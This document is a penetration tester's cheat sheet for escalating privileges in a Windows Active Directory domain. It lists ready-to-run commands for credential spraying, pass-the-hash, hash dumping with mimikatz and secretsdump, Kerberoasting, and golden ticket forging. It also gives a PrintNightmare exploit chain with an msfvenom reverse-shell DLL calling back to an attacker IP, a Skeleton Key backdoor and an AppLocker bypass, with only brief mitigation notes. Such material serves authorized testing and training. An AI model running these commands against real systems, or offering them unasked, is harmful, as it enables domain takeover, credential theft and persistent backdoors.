---
title: 5 – Privesc Windows Domain
summary: Privilege Escalation step – a note for elevating privileges on a Windows Domain.
description: Privilege Escalation step – a note for elevating privileges on a Windows Domain.
---

# Resources

---

* [Pentesting Active Directory Mind Map - ODC](https://github.com/esidate/pentesting-active-directory/tree/main)
* [Top Five Ways I Got Domain Admin 2018 Edition - Adam Toscher](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)

![killchain-AD-attacks_mind_map.png](../attachments/killchain-AD-attacks_mind_map.png) 
Credit: The Hacker Recipes - https://www.thehacker.recipes/ad/movement/ntlm

# Enumerate Users and Groups

---

### POWERVIEW


 > 
 > **<font color=red>Get-NetUser</font>**</br>
 > Enumerate users and their properties. 
 > 
 > **<font color=red>Get-NetUser | select cn</font>**</br>
 > Enumerate domain Common Names for users.
 > 
 > **<font color=red>Get-NetUser | select description</font>**</br>
 > Enumeration description for users.

 > 
 > **<font color=red>Get-UserPropery -Properties logoncount</font>**</br>
 > Show connection count (might see a honeypot account).

 > 
 > **<font color=red>Get-NetGroupMember -name "Domain Admins"</font>**</br>
 > Enumerate users belonging to admin groups.
 > 
 > **<font color=red>Get-NetGroup -name \*admin\*</font>**</br>
 > Enumerate all groups with admin in it.

# Enumerate Domain Information

---

### POWERVIEW


 > 
 > **<font color=red>Get-NetDomain</font>**</br>
 > Infos about the domain.
 > 
 > **<font color=red>Get-NetDomainController</font>**</br>
 > Info about the Domain Controller.

 > 
 > **<font color=red>Get-NetComputer</font>**</br>
 > Infos about servers and computers in the domain.

 > 
 > **<font color=red>Get-DomainPolicy</font>**</br>
 > Infos about Domain Policy.

 > 
 > **<font color=red>Get-NetGPO</font>**</br>
 > List GPOs.
 > 
 > **<font color=red>Get-NetGPO | select displayname, whenchanged</font>**</br>
 > List policies with when they were changed.

# Pass the Password

---

### IMPACKET-PSEXEC

### Hands On


 > 
 > **<font color=red>crackmapexec smb</font> \[TARGET_NETWORK_ADDRESS\]<font color=red>/</font>\[TARGET_CIDR\] <font color=red>-d</font> \[TARGET_DOMAIN\] <font color=red>-u</font> \[mySamName\] <font color=red>-p</font> \[myUserPassword\]**</br>
 > Pass the Password around the network to find pwnable machines.

![tool-crackmapexec-example.png](../attachments/tool-crackmapexec-example.png)


 > 
 > **<font color=red>python3 /opt/impacket/examples/psexec.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>mySamName<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\]**</br>
 > Get a shell on the tageted machine (Psexec is the most noisy).

 > 
 > **<font color=red>python3 /opt/impacket/examples/smbexec.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>mySamName<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\]**</br>
 > Get a shell on the tageted machine.

 > 
 > **<font color=red>python3 /opt/impacket/examples/wmiexec.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>mySamName<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\]**</br>
 > Get a shell on the tageted machine.

# GPP Attack

---

### GPP-DECRYPT

### Principle

GPP (Group Policy Preferences) are policies with credentials embedded (they are encrypted and placed in `cPassword`).

The encryption key was released, so it is possible to decrypt GPP policies that have been encrypted with this key.

### Detection


 > 
 > **<font color=red>use</font> <font color=lightblue>auxiliary/scanner/smb/smb_enum_gpp</font>**</br>
 > Detect vulnerable GPP policies (credentials encrypted with leaked key).

### Hands On


 > 
 > **<font color=red>gpg-decrypt</font> mycPasswordEncrypted**</br>
 > Decrypt GPP enmbedded credentials.

# Hash Dump

---

### IMPACKET-SECRETDUMP (Remote)


 > 
 > **<font color=red>python3 /opt/impacket/examples/secretsdump.py</font> myDomain<font color=red>/</font>myUser<font color=red>:</font>myPass<font color=red>@</font>\[TARGET_DC_IP\]**</br>
 > Connect to the target and dump hashes. 

---

### MIMIKATZ (On Target)


 > 
 > **<font color=red>privilege::debug</font>**</br>
 > Ensure that current user has administrator privileges (the output should be `[output '20' OK]`). This indicates that debugging a process is possible.

 > 
 > **<font color=red>lsadump::lsa /patch</font>**</br>
  
 > Dump LSA Hashes (Local Security Authority).

 > 
 > **<font color=red>lsadump::sam</font>**</br>
 > Dump SAM NT Hashes.

 > 
 > **<font color=red>sekurlsa::logonpasswords</font>**</br>
 > Dump Hashes from LSAA Memory (Hashes of currently logged-in users).

# Pass the Hash

---

### CRACKMAPEXEC, EVIL-WINRM or IMPACKET-PSEXEC

### Theory

Pass the Hash attack is **possible with `NTLM` authentication protocol**, but will not work with `NTLMv2`.

There are two different hash types, `LM` and `NT`:

* LM hash example: 

 > 
 > Administrator:500:<font color=red>aad3b435b51404eeaad3b435b51404ee</font>:0e0363213e37b94221497260b0bc:::

* NT hash example: 
  \>Administrator:500:aad3b435b51404eeaad3b435b51404ee:<font color=red>0e0363213e37b94221497260b0bc:::</font>

### Hands On

#### Pass NT Hash


 > 
 > **<font color=red>crackmapexec smb </font>\[TARGET_NETWORK_ADDRESS\]<font color=red>/</font>\[TARGET_CIDR\] <font color=red>-u</font> \[mySamName\] <font color=red>-H</font> \[myUserNTHASH\] <font color=red>--local-auth</font>**</br>
 > Pass the Hash attack (NT Hash) around the network to find vulnerable machines.


 > 
 > **<font color=red>evil-winrm -i</font> \[TARGET_IP\] <font color=red>-u</font> \[myUser\] <font color=red>-H </font>\[myUserNTHASH\]**</br>
 > Pass the Hash attack (NT Hash).

#### Pass LM+NT Hash


 > 
 > **<font color=red>python3 /opt/impacket/examples/psexec.py </font>\[TARGET_DOMAIN\]<font color=red>/</font>\[mySamName\]<font color=red>@</font>\[TARGET_IP\] <font color=red>-hashes</font> \[myUserLMHASH\]<font color=red>:</font>\[myUserNTHASH\]**</br>
 > Pass the Hash attack (LM+NT).

### Mitigation

* Limit account re-use:
  * Don't re-use passwords (e.g. Local Admin and Domain Admin).
  * Disable local Guest and Administrator accounts.
  * Limit who is local Administrator.
* Enforce strong password policy:
  * Long, random, no common words, ...
  * Rotate password on a regular basis.
    Credit: TCM Security

# Pass the Ticket

---

### MIMIKATZ

### Hands On

#### Find Local Kribi Tickets


 > 
 > **<font color=red>privilege::debug</font>**</br>
 > Ensure that current user has administrator privileges (the output should be `[output '20' OK]`). This indicates that debugging a process is possible.


 > 
 > **<font color=red>sekurlsa::tickets /export</font>**</br>
 > Export all `.kirbi` tickets into the current directory.

#### Find others Kirbi Tickets (Password Spray)


 > 
 > **<font color=red>Rubeus.exe brute /password:</font>myPassword <font color=red>/noticket</font>**</br>
 > Spray a password against all users in current domain and return the .kirbi TGT of users that use this password.

#### Pass the Ticket


 > 
 > **<font color=red>kerberos::ptt</font> myTicketFromSekurlsa<font color=red>.kirbi</font>**</br>
 > Cache and impersonate the given ticket.

# Token Impersonation

---

### METERPRETER

### Theory

Tokens are like session cookies to access a system or network.

Delegate tokens exist on the machine the moment a user login (and remain until the computer is rebooted).

They are two types of tokens:

* Delegate: Create for logging into a machine or using Remote Desktop.
* Impersonate: Non-interactive, such as attaching a network drive or a domain logon script.
  Credit: TCM Security

### Hands on

If the current user has **SeDebugPrivilege** and **SeImpersonatePrivilege** privileges enabled, we are able to impersonate another user.

 > 
 > **<font color=red>load incognito</font>**</br>
 > Load icognito module.
 > 
 > **<font color=red>list_tokens -u</font>**</br>
 > List Delegation Tokens available (not sure of the flag maybe `-g`).
 > 
 > **<font color=red>impersonate_token</font> "BUILTIN\\Administrators"**</br>
 > Impersonate token.

To determine rights, Windows uses the Primary Token of the process and not the impersonated token. So we have to migrate to a process with correct permissions. 

The safest to pick is **services.exe**.

 > 
 > **<font color=red>migrate</font> 668**</br>
 > Migrate to process 668.

 > 
 > **<font color=red>rev2self</font>**</br>
 > Revert to previous user.

### Mitigation

* Limit user/group token creation permissions.

# Kerberoasting

---

### Find AS-Kerbroastable Hash

#### With GetUserSPNs

SPN (Service Principal Name) is the mapping between service and account.

 > 
 > **<font color=red>setspn -T medin -Q ​ */*</font>**</br>
 > Enumerate SPN.

 > 
 > **<font color=red>python3 /opt/impacket/examples/GetUserSPNs.py</font> mydomain.local<font color=red>/</font>myUser<font color=red>:</font>myPassword <font color=red>-dc-ip</font> \[TARGET_DC_IP\] <font color=red>-request</font>**</br>
 > Dump Kerberos hash of kerberoastable users. (Then `hashcat -m 13100`).

#### With Rubeus

 > 
 > **<font color=red>Rubeus.exe kerberoast</font>**</br>
 > Dump Kerberos hashes of kerberoastable users (like GetUserSPNs.py but on the target machine). Then use `hashcat -m 13100`.

---

### Find AS-REProastable Hash

#### With Rubeus

 > 
 > **<font color=red>Rubeus.exe asreproast</font>**</br>
  
 > Run AS-REP roast command looking for vulnerable users.  (Then Insert `23$` after `$krb5asrep$` and use `hashcat -m 18200`).

---

### IMPACKET-GETUSERSPNS

### Principle

![exploit_kerberoasting_principle.png](../attachments/exploit_kerberoasting_principle.png)

### Requirements

* Have valid user credentials (not necessarily admin).

### Hands On


 > 
 > **<font color=red>python3 /opt/impacket/examples/GetUserSPNs.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>\[VALID_USER\]<font color=red>:</font>\[VALID_PASSWORD\] <font color=red>-dc-ip</font> \[DOMAIN_CONTROLLER_IP\] <font color=red>-request</font>**</br>
 > Get a TGS.

### Mitigation

* Have a very strong password for service accounts.
* Don’t make services accounts domain administrators.

# Golden/Silver Ticket

---

### MIMIKATZ

### Principle

Forge a special ticket and then is it with Pass the Ticket Attack to gain elevated privileges. 
A Golden Ticket is TGT (Ticket Granting Ticket).
A Silver Ticker is TGS (Ticket Granting Service).

### Requirements


 > 
 > **<font color=red>privilege::debug</font>**</br>
 > Ensure that current user has administrator privileges (the output should be `[output '20' OK]`). This indicates that debugging a process is possible.

### Hands On (MIMIKATZ)


 > 
 > **<font color=red>lsadump::lsa /inject /name:</font>krbtgt**</br>
 > Dump hash and security identifier required to create a Golden Ticket. 

Note: To create a Silver Ticket, change the `/name:` to a domain admin account or a service account.

![exploit-lsadump-golden_ticket.png](../attachments/exploit-lsadump-golden_ticket.png)
Credit: TCM Security

 > 
 > **<font color=red>kerberos::golden /user:</font>Administrator <font color=red>/domain:</font>mycontroller.local <font color=red>/sid:</font>S-1-5-21-432953485-3795405108-1502158860  <font color=red>/krbtgt:</font>72cd714611b64cd4d5550cd2759db3f6 <font color=red>/id:500 /ptt</font>**</br>
 > Create a golden ticket (`/ptt` stands for Pass The Ticket, if we don’t put it, the command will save the ticket to a file).

Note: To create a Silver Ticket, simply put a service NTLM hash into the `/krbtgt:` slot, the sid of the service account into `/sid:`, and change the `/id:` to 1103.


 > 
 > **<font color=red>misc::cmd</font>**</br>
 > Open a new elevated command prompt with the given ticket in Minikatz.

 > 
 > **<font color=red>dir \\\\TARGET-MACHINE-NAME\\c$</font>**</br>
 > List files in c drive of the machine.

 > 
 > **<font color=red>PsExec.exe </font>\\\\TARGET-MACHINE-NAME<font color=red>cmd.exe</font>**</br>
 > Get a shell on the machine.

# Exploit

---

### PrintNightmare (CVE-2021-1675)

### Hands On

#### Generate Malicious DLL


 > 
 > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f dll -o</font> msfvenom_revshell<font color=red>.dll</font>**</br>
 > Generate a malicious DLL (meterpreter reverse shell).

#### Create an SMB Share to Serve the Malicious DLL


 > 
 > **<font color=red>python3 /opt/impacket/examples/smbserver.py</font> myShareName /path/to/folder/ <font color=red>-smb2support</font>**</br>
 > Set up an SMB share.

#### Set up Handler


 > 
 > **<font color=red>use</font> <font color=lightblue>exploit/multi/handler</font>**</br>
 > 
 > **<font color=red>set payload</font> windows/x64/meterpreter/reverse_tcp**</br>
 > Handler for Windows Meterpreter.

#### Exploit

**https://github.com/cube0x0/CVE-2021-1675** 

 > 
 > **<font color=red>python3 /opt/impacket/examples/CVE-2021-1675.py</font> myUser<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\] <font color=red>'\\\\</font>\[ATTACKER_IP\]<font color=red>\\</font>
**myShareName**<font color=red>\\</font>msfvenom_revshell.dll'**<font color=red></font></br>
 > Run the exploit: privilege escalation (might display an error but meterpreter session is on).

# Persistence and Evasion

---

### Skeleton Key

### Principle

The Skeleton Key is backdoor: this attack set a master password for domain Admin. It will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques 

### Requirements


 > 
 > **<font color=red>privilege::debug</font>**</br>
 > Ensure that current user has administrator privileges (the output should be `[output '20' OK]`). This indicates that debugging a process is possible.

### Hands On


 > 
 > **<font color=red>misc::skeleton</font>**</br>
 > Create a backdoor with credentials "mimikatz". 

 > 
 > **<font color=red>dir \\\\</font>Desktop-1<font color=red>\\c$</font> <font color=red>/user:</font>Machine1 <font color=red>mimikatz</font>**</br>
 > List C: drive content using Skleton Key backdoor. 

---

### AppLocker Bypass

If AppLocker is configured with default rules, we can bypass it by placing our executable in whitelisted by default directories. Example:

* `C:\Windows\System32\spool\drivers\color`
